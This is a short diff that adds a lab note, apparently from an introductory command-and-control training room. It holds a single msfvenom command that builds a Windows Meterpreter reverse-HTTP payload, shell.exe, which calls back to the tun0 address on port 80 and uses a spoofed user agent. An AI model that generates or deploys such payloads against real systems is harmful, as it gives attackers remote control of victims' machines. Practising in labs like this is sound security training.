@@ -1,0 +1,6 @@
+
+Generating payload using msfvenom for intro to C2 room 
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+
+
